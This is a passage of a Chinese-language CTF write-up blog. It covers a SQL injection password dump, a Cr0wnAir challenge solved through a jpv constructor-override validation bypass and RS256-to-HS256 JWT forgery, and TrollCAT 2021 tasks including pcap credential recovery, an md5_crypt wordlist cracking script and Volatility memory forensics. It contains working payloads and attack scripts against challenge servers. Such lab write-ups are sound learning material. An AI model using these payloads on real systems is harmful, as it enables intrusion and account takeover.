class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(password),3%20from%20users--+</span><br></pre></td></tr></table></figure><p>得到如下回显。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;,RightBehindU,diamond69_hands420,winter2020,peter1,password,ilikesex</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;</span><br></pre></td></tr></table></figure><h3 id="Cr0wnAir"><a href="#Cr0wnAir" class="headerlink" title="Cr0wnAir"></a>Cr0wnAir</h3><blockquote><p>Cr0wn is getting into the airline business to make some sweet profits when everyone is able to travel again. Can you upgrade your trip?</p></blockquote><blockquote><p>题目附件： <a href="https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh">https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh</a></p></blockquote><p>附件下载下来，可以发现是 nodejs 的项目。首先看一下项目的 package.json。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;cr0wnAir&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;app.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node app.js&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;hyperreality&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;4.17.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jpv&quot;</span>: <span class="string">&quot;2.0.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jwt-simple&quot;</span>: <span class="string">&quot;0.5.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>npm audit</code> 可以发现报出的一个 jwt-simple 的高危漏洞，根据<a href="https://www.npmjs.com/advisories/831">描述</a>，它允许我们使用 HS256 算法的 token 去代替 RS256 算法的 token 成功解码。同时可以发现 jpv 使用的是蛮老的包。在 Synk 可以查到这个版本的<a href="https://snyk.io/vuln/SNYK-JS-JPV-536466">一个高危漏洞</a>。定位到 <a href="https://github.com/manvel-khnkoyan/jpv/issues/6">Issue</a> 可以发现相关的 PoC 作用于 <code>jpv.validate</code> 方法上。写一段代码复现这个漏洞。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jpv = <span class="built_in">require</span>(<span class="string">&quot;jpv&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> inputA = &#123;</span><br><span class="line">a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Lemon&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> inputB = &#123;</span><br><span class="line">a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> pattern = &#123;</span><br><span class="line">a: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputA, pattern))</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputB, pattern))</span><br></pre></td></tr></table></figure><p>得到的结果如下图。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/temporaryButter/1614010796900.c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png"></p><p>这说明我们构造的输入覆盖了 constructor 最终影响到了 jpv 的判断。接下来具体看看附件给的代码。</p><p>在 checkin.js 的第 45 行可以发现如下内容。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br></pre></td></tr></table></figure><p>26 行处可以找到这题 JWT 的加密方式 RS256。如果需要伪造 JWT 则必须想办法先拿到 key。这里可以使用 <a href="https://github.com/silentsignal/rsa_sign2n">rsa_sig2n</a> 通过 token 去算出 key，因此至少要拿到两个可用的 token。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> jwt.encode(body, config.privkey, <span class="string">&#x27;RS256&#x27;</span>);</span><br></pre></td></tr></table></figure><p>37 行处可以发现它使用到了上述高危漏洞所影响的方法，首先将这一部分判断的代码摘出来。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (jpv.validate(data, pattern, &#123; <span class="attr">debug</span>: <span class="literal">true</span>, <span class="attr">mode</span>: <span class="string">&quot;strict&quot;</span> &#125;)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[<span class="string">&quot;firstName&quot;</span>] == <span class="string">&quot;Tony&quot;</span> &amp;&amp; data[<span class="string">&quot;lastName&quot;</span>] == <span class="string">&quot;Abbott&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in! Please remember not to post your boarding pass on social media.&quot;</span>&#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data[<span class="string">&quot;ffp&quot;</span>]) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer.&quot;</span>&#125;;</span><br><span class="line">      <span class="keyword">for</span>(e <span class="keyword">in</span> data[<span class="string">&quot;extras&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] &amp;&amp; data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] === <span class="string">&quot;FQTU&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> token = createToken(data[<span class="string">&quot;passport&quot;</span>], data[<span class="string">&quot;ffp&quot;</span>]);</span><br><span class="line">          <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in!&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;Invalid checkin data provided, please try again.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以发现在达成部分条件后可以拿到可用的 token。但是与此同时，这个条件是看似不可达的，因为有如下的验证机制。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pattern = &#123;</span><br><span class="line">  firstName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  lastName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  passport: <span class="regexp">/^[0-9]&#123;9&#125;$/</span>,</span><br><span class="line">  ffp: <span class="regexp">/^(|CA[0-9]&#123;8&#125;)$/</span>,</span><br><span class="line">  extras: [</span><br><span class="line">    &#123;<span class="attr">sssr</span>: <span class="regexp">/^(BULK|UMNR|VGML)$/</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现此时的 FQTU 是不可能符合这个 pattern 的字符串。此时就需要使用上面的漏洞来构造 payload。通过观察可知这里的 <code>extras</code> 是一个数组，先按照原有结构构造一下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">extras: [</span><br><span class="line">&#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时它是没法通过检查的，但是当它变成如下的样子，就可以通过这个检查了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">extras: &#123;</span><br><span class="line"><span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line"><span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时构造的这个 payload 符合了判断中的所有条件，将其放到请求中发送出去可以得到有效的 token。这里写个脚本获取一下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">extras: &#123;</span><br><span class="line"><span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line"><span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">axios.post(<span class="string">&quot;http://34.105.202.19:3000/checkin&quot;</span>, data).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;token&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>更换一下可变的参数后请求两次可以得到如下两个有效的 token。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc2In0.B86GaaGsm7i1sbszIdebYCzleDwLO6CI3ZaM21wl4-dkN0wAOz8Y3U5r8ukwrA8SV0Mtm23wsTFzaem5BTUbxtw949IUdweaZHJ1IrV1oJKxtY5XrFmim9Od6UrAmG9MhArEG6FRGsXzHbJkcP3cnMWiKPvt71U26VYpYeuZ2dmhufKGh_sYycFN1BZWWsfTK9cbXAw8dMSSFUlrmFxedA-uUkKw-n3Bged_fBBLzeB55WYKa_bX99l1I5S7F4hh4GaU44_thXeQA7VmxNIvRFusKdg7z7zcf3MA981JB1Pjgb2jMQdS7ktMyrP6VhZrJMcQ2EWKv65MpzCj-fB-Ag</span><br></pre></td></tr></table></figure><p>使用上面提到的 rsa_sig2n 工具可以得到如下公钥。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw5lfZkrAzBjl2uf2bF4q</span><br><span class="line">uWzPbmEzcsjVGwEePrj3tQh2gQWMw7HOvNNqVMWbuyK0VYWyk&#x2F;EJ2IXkrV+R7yz1</span><br><span class="line">ROFf2gMH6MRcdVakQF0MQJVRGOmwAIxi+Y7X3fo8HsjJVzzEk4Xy+nWTGS&#x2F;FuNSW</span><br><span class="line">+n0ch81nlZykurVcDKTS7zxPjOtkOswfypoqZyEJ8Uyn32VgWcZ1IK4CB1m9Za0j</span><br><span class="line">DLU30ohyT3e3GUWT+qkUSiaHtMTViq8CxSMzlfFC1ASmAT1wGE+&#x2F;rcUtTPvVKmh0</span><br><span class="line">fTO2sqEsCQp2MGzKk8K1IhwdvuaXqgOFGIcBbaqMwKjpXIfTJSIb7rwEy&#x2F;i3N9y8</span><br><span class="line">CwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>至此成功拿到了题目编码 JWT 所用的公钥。继续审计代码，可以在 upgrades.js 下发现如下代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/flag&#x27;</span>, [getLoyaltyStatus], <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (res.locals.token &amp;&amp; res.locals.token.status == <span class="string">&quot;gold&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: config.flag &#125;;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You do not qualify for this upgrade at this time. Please fly with us more.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此时只需要伪造一段 JWT 使其 status 满足要求即可。这里使用旧版的包 <code>pyjwt==0.4.3</code> 去生成一个 HS256 算法的 token。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;c3995f664ac0cc18_65537_x509.pem&quot;</span>).read()</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;gold&quot;</span>&#125;, key, <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>再用 axios 去请求，可得到 flag。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line">axios(&#123;</span><br><span class="line">method: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">url: <span class="string">&quot;http://34.105.202.19:3000/upgrades/flag&quot;</span>,</span><br><span class="line">headers: &#123;</span><br><span class="line"><span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJnb2xkIn0.aMSl9yfOJoNV3Xzd0vZqhTRgxNrII_iXt6k5w6P1g3E&quot;</span></span><br><span class="line">&#125;&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;I_&lt;3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TrollCAT CTF 2021</title>
      <link href="/zh-CN/posts/447b0fce.html"/>
      <url>/zh-CN/posts/447b0fce.html</url>
      
        <content type="html"><![CDATA[<h3 id="Change-my-mind"><a href="#Change-my-mind" class="headerlink" title="Change my mind"></a>Change my mind</h3><p>使用 Stegsolve 解隐写可以发现 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613563863021.7963be2c84c2e5d040bb334d072467b10646e2f8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;I_L0v3_Tr011C4t&#125;</span><br></pre></td></tr></table></figure><h3 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h3><p>附件给出了一个 .car 文件。使用 binwalk 可知其中包含 bzip2 的压缩数据。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613564353680.66a1b77dc9f33188a9a70607578db36f7de97ca0.png" alt="image-20210217201913451"></p><p>接着尝试使用 <code>binwalk -e</code> 将文件分离出来。分离出来后发现直接得到了 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;M0zilla_Archive_maaaarls&#125;</span><br></pre></td></tr></table></figure><h3 id="Granny-wants-you"><a href="#Granny-wants-you" class="headerlink" title="Granny wants you"></a>Granny wants you</h3><blockquote><p>Help my granny login, while monitoring my network one day I was able to capture the credentials, go through this file to get ther credentials</p><p>Flag format : username:password ( no – {} ) </p><p>Author: dboidembla</p></blockquote><p>这题给的流量包中有 300+ 个 TCP 流，因此题目描述中的 login 和 credentials 很重要。结合题目描述可知要找的是登录凭证。既然是登录那应该是 POST 请求。筛选出 POST 请求后可在其中一个里找到如下信息。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613565891442.ddc17478d73642825b5cc2a738b748f7a1de1d04.png"></p><p>将其中的信息摘取下来。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;E0IPJIyDGxq2Mx56oz12LKD%3D&amp;pass&#x3D;01001001+00110010+01001001+01100110+01001100+00110010+00111001+01100111+01001101+01001001+00111001+00110000+01101111+00110001+00111001+01010001+01001000+00110000+01000001+01101001+01001101+01010100+01001001+01101100+01110000+00110010+01110101+00110001+01001100+01110100+00111101+00111101</span><br></pre></td></tr></table></figure><p>其中的 <code>E0IPJIyDGxq2Mx56oz12LKD%3D</code> 经过 <code>URL Decode --&gt; From Base64 --&gt; ROT13</code> 的路径解码后可得到 <code>TROLLCATisAmazing</code>。<code>pass</code> 参数的内容将 + 替换为空格后再经过 <code>From Binary --&gt; From Base64(N-ZA-Mn-za-m0-9+/=)</code> 的路径解码后可以得到 <code>Welcome_to_CSCodershub</code>。（需要注意这一步的 base64 解码是换表的解码）根据题目描述将两段字符串用冒号拼接即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TROLLCATisAmazing:Welcome_to_CSCodershub</span><br></pre></td></tr></table></figure><h3 id="Rich-Orphan"><a href="#Rich-Orphan" class="headerlink" title="Rich Orphan"></a>Rich Orphan</h3><blockquote><p>参考：</p><p><a href="https://passlib.readthedocs.io/en/stable/lib/passlib.hash.md5_crypt.html">https://passlib.readthedocs.io/en/stable/lib/passlib.hash.md5_crypt.html</a></p></blockquote><p>根据附件给出的 hash 格式可知是 md5_crypt。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>按照参考文档写个脚本使用 GitHub 一万常见密码表爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> passlib.<span class="built_in">hash</span> <span class="keyword">import</span> md5_crypt</span><br><span class="line"></span><br><span class="line">passwordFile = <span class="built_in">open</span>(<span class="string">&quot;10-million-password-list-top-10000.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">passwords = passwordFile.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">HASH = <span class="string">&quot;$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0&quot;</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    <span class="keyword">if</span> md5_crypt.verify(password, HASH):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found password $&#123;&#125;$&quot;</span>.<span class="built_in">format</span>(password))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Trying password $&#123;&#125;$&quot;</span>.<span class="built_in">format</span>(password))</span><br></pre></td></tr></table></figure><p>运行脚本可以得到密码是 <code>batman</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;batman&#125;</span><br></pre></td></tr></table></figure><h3 id="Mr-evilpepo"><a href="#Mr-evilpepo" class="headerlink" title="Mr_evilpepo"></a>Mr_evilpepo</h3><p>volatility2 跑一下 imageinfo 得到 profile。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613572849298.6624ae56675b36d4d5b3278722838b27acdb3fb4.png"></p><p>cmdline 下可以发现一个编辑 mysecret.txt 的指令，于是 filescan 一下将其在内存中的位置找出来。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613573196970.a1e82fa5d3b61ae0904a6ec389039502583113f4.png"></p><p>使用 dumpfiles 将这个文档提取出来，可以得到以下内容。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613573387893.5f73db3e733aed7658a185b50eddb360e9a02013.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mega.nz/file/m18HSSaJ#_4Gmn4aWnrKN2716fMdSQogECaGsS5kKkDAytocSCZM</span><br></pre></td></tr></table></figure><p>将文件下载下来，得到 secret 文件。接着在镜像中找线索，使用 cmdscan 查看 cmd 的执行历史，可以发现一个 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613573643436.d3a1adecab2360cf81ca70743afe602b1aabbf18.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trolcat&#123;commands_4r3_important&#125;</span><br></pre></td></tr></table></figure><p>在 pslist 中还可以发现 Chrome 的进程，于是提取 Chrome 的历史记录。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613574634501.85382708a6ed17be604bc74ee6130ae1f5786320.png"></p><p>可以发现使用者访问了 VeraCrypt 的下载页面和一个加密 Pastebin 的网站。同时往上找可以得到使用者粘贴的内容的网址。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://defuse.ca/b/sOOqp4UunTdD0oUjidJFlzs</span><br></pre></td></tr></table></figure><p>使用 hashdump 读取用户账户密码的 hash <code>2e6a7cf5aabb33a044684dd9c97e88a7</code>。使用在线破解可以得到密码为 abracadabra。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613575323381.9059cbee6db9d02ccdaa7acf663737193c2cff76.png"></p><p><img 